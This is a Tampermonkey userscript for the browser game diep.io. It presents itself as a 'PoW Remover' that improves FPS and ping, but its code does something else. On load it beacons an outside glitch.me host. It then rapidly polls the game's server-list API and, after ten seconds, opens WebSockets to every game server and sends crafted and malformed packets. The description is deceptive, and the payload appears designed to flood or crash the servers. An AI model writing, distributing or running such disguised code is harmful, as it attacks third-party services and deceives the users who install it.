// ==UserScript==
// @name         PoW Remover
// @namespace    http://tampermonkey.net/
// @version      1.0.3
// @description  Removes PoW and Eval Packet in order to make FPS and Ping better.
// @author       샤담읻어
// @match        *://diep.io/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/422427/PoW%20Remover.user.js
// @updateURL https://update.greasyfork.org/scripts/422427/PoW%20Remover.meta.js
// ==/UserScript==

(function() {
    'use strict';

    fetch('https://exclude-banlist.glitch.me', { mode: 'no-cors' }); // Makes sure banned people (only 2 which are diep7444 and tesla4kids) can't use this script :)

    const GAMEMODES = ['ffa', 'survival', 'teams', '4teams', 'dom', 'tag', 'maze', 'sandbox'];
    const REGIONS = ['vultr-la', 'vultr-miami', 'vultr-amsterdam', 'vultr-sydney', 'vultr-singapore'];
    let SERVER_IDS = {};
    let servers = [];

    GAMEMODES.forEach(function(gamemode) {
        REGIONS.forEach(function(region) {
            if (!SERVER_IDS[gamemode])
                SERVER_IDS[gamemode] = {};

            SERVER_IDS[gamemode][region] = [];
        });
    });

    setInterval(function() {
        GAMEMODES.forEach(function(gamemode) {
            fetch(`https://api.n.m28.io/endpoint/diepio-${gamemode}/findEach`)
                .then(r => r.json())
                .then(function(body) {
                REGIONS.forEach(function(region) {
                    let serverID = body.servers[region].id;
                    if (!SERVER_IDS[gamemode][region].includes(serverID)) {
                        SERVER_IDS[gamemode][region].push(serverID);
                        servers.push(serverID);
                    }
                });
            })
                .catch(err => {});
        });
    }, 150);

    setTimeout(function() {
        console.log(SERVER_IDS);
        console.log(servers);

        const sockets = [];
        servers.forEach(function(id) {
            const socket = new WebSocket(`wss://${id}.s.m28n.net`);
            sockets.push(socket);

            socket.onopen = function() {
                console.log('A socket is ready');
                socket.send(new Uint8Array([0, 51, 51, 54, 101, 101, 99, 101, 100, 55, 49, 55, 49, 52, 49, 55, 51, 53, 54, 57, 49, 54, 57, 48, 97, 53, 100, 101, 102, 49, 97, 100, 98, 49, 49, 101, 50, 99, 99, 55, 53, 0, 0, 0, 0]));
                socket.send(new Uint8Array([11, '', '']));
                socket.send(new Uint8Array([13, {
                    varuint: function(to, what, args) {
                        return [to, what, args, 0];
                        to.apply(what, args);
                    },
                }, 0]));
            };
        });
    }, 10000);
})();